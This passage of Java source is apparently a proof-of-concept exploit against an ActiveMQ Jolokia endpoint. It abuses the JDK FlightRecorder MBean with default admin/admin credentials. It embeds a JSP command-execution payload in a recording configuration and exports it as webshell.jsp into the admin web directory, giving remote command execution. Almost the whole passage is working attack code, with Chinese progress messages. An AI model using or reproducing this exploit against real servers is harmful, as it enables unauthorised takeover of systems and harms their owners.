name=\\\"off\\\">off</option>        <option label=\\\"Errors Only\\\" name=\\\"errors\\\">errors</option>        <option label=\\\"All Exceptions, including Errors\\\" name=\\\"all\\\">all</option>      </selection>      <condition name=\\\"enable-errors\\\" true=\\\"true\\\" false=\\\"false\\\">        <or>          <test name=\\\"exception-level\\\" operator=\\\"equal\\\" value=\\\"errors\\\"/>          <test name=\\\"exception-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>        </or>      </condition>      <condition name=\\\"enable-exceptions\\\" true=\\\"true\\\" false=\\\"false\\\">        <test name=\\\"exception-level\\\" operator=\\\"equal\\\" value=\\\"all\\\"/>      </condition>      <selection name=\\\"memory-leak-detection\\\" default=\\\"minimal\\\" label=\\\"Memory Leak Detection\\\">        <option label=\\\"Off\\\" name=\\\"off\\\">off</option>        <option label=\\\"Object Types\\\" name=\\\"minimal\\\">minimal</option>        <option label=\\\"Object Types + Allocation Stack Traces\\\" name=\\\"medium\\\">medium</option>        <option label=\\\"Object Types + Allocation Stack Traces + Path to GC Root\\\" name=\\\"full\\\">full</option>      </selection>      <condition name=\\\"memory-leak-detection-enabled\\\" true=\\\"false\\\" false=\\\"true\\\">        <test name=\\\"memory-leak-detection\\\" operator=\\\"equal\\\" value=\\\"off\\\"/>      </condition>      <condition name=\\\"memory-leak-detection-stack-trace\\\" true=\\\"true\\\" false=\\\"false\\\">        <or>          <test name=\\\"memory-leak-detection\\\" operator=\\\"equal\\\" value=\\\"medium\\\"/>          <test name=\\\"memory-leak-detection\\\" operator=\\\"equal\\\" value=\\\"full\\\"/>        </or>      </condition>      <condition name=\\\"memory-leak-detection-cutoff\\\" true=\\\"1 h\\\" false=\\\"0 ns\\\">        <test name=\\\"memory-leak-detection\\\" operator=\\\"equal\\\" value=\\\"full\\\"/>      </condition>      <text name=\\\"synchronization-threshold\\\" label=\\\"Synchronization Threshold\\\" contentType=\\\"timespan\\\" minimum=\\\"0 s\\\">20 ms</text>      <text name=\\\"file-io-threshold\\\" label=\\\"File I/O Threshold\\\" contentType=\\\"timespan\\\" minimum=\\\"0 s\\\">20 ms</text>      <text name=\\\"socket-io-threshold\\\" label=\\\"Socket I/O Threshold\\\" contentType=\\\"timespan\\\" minimum=\\\"0 s\\\">20 ms</text>      <flag name=\\\"class-loading-enabled\\\" label=\\\"Class Loading\\\">false</flag>    </control></configuration>";
        String body = "{\n" +
                " \"type\": \"EXEC\",\n" +
                " \"mbean\": \"jdk.management.jfr:type=FlightRecorder\",\n" +
                " \"operation\": \"setConfiguration\",\n" +
                " \"arguments\": [" + value + ",\"" + configXml + "\"]\n" +
                "}";
        String response = httpRequest.sendStringPost(httpPost, body);
        JSONObject json = (JSONObject) JSONObject.parse(response);

        return (int)json.get("status") == 200;
    }

    public static boolean startRecording(String url, String authBase64, int value) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setHeader("Authorization","Basic " + authBase64);
        httpPost.setHeader("Origin","http://127.0.0.1:8161/");
        String body = "{\n" +
                " \"type\": \"EXEC\",\n" +
                " \"mbean\": \"jdk.management.jfr:type=FlightRecorder\",\n" +
                " \"operation\": \"startRecording\",\n" +
                " \"arguments\": [" + value + "]\n" +
                "}";
        String response = httpRequest.sendStringPost(httpPost, body);
        JSONObject json = (JSONObject) JSONObject.parse(response);

        return (int)json.get("status") == 200;
    }

    public static boolean stopRecording(String url, String authBase64, int value) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setHeader("Authorization","Basic " + authBase64);
        httpPost.setHeader("Origin","http://127.0.0.1:8161/");
        String body = "{\n" +
                " \"type\": \"EXEC\",\n" +
                " \"mbean\": \"jdk.management.jfr:type=FlightRecorder\",\n" +
                " \"operation\": \"stopRecording\",\n" +
                " \"arguments\": [" + value + "]\n" +
                "}";
        String response = httpRequest.sendStringPost(httpPost, body);
        JSONObject json = (JSONObject) JSONObject.parse(response);

        return (int)json.get("status") == 200;

    }

    public static boolean copyTo(String url, String authBase64, int value, String filepath) throws IOException {

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setHeader("Authorization","Basic " + authBase64);
        httpPost.setHeader("Origin","http://127.0.0.1:8161/");
        String body = "{\n" +
                " \"type\": \"EXEC\",\n" +
                " \"mbean\": \"jdk.management.jfr:type=FlightRecorder\",\n" +
                " \"operation\": \"copyTo\",\n" +
                " \"arguments\": [" + value + ",\"" + filepath + "\"]\n" +
                "}";
        String response = httpRequest.sendStringPost(httpPost, body);
        JSONObject json = (JSONObject) JSONObject.parse(response);

        return (int)json.get("status") == 200;

    }

    public static void main(String[] args) throws IOException {

        String username = "admin";
        String password = "admin";
        String url = "http://10.58.120.201:8161/api/jolokia/list";
        String jspString = "&#x3c;%Runtime.getRuntime().exec(request.getParameter(\\\"i\\\"));%&#x3e;";
//        String jspString = "&#x3c;%out.println(\\\"success\\\");%&#x3e;";
        String filepath = "../webapps/admin/webshell.jsp";
        String authBase64 = getBase64String(username, password);
        boolean exist = checkExistFlightRecorder(url, authBase64);
        if(!exist) {
            System.out.println("漏洞不存在");
            return;
        }
        HashMap<String, Integer> map = createNewRecording(url, authBase64);
        int value = map.get("value");
        int status_code = map.get("status");
        if (status_code != 200) {
            System.out.println("创建新纪录失败..");
            return;
        }
        boolean ok = setConfiguration(url, authBase64, value, jspString);
        if(!ok) {
            System.out.println("设置配置文件失败..");
            return;
        }
        boolean ok2 = startRecording(url, authBase64, value);
        if(!ok2) {
            System.out.println("执行开始记录失败..");
            return;
        }
        boolean ok3 = stopRecording(url, authBase64, value);
        if(!ok3) {
            System.out.println("执行停止记录失败..");
            return;
        }
        boolean ok4 = copyTo(url, authBase64, value, filepath);
        if(!ok4) {
            System.out.println("执行导出记录失败..");
            return;
        }
    }
}
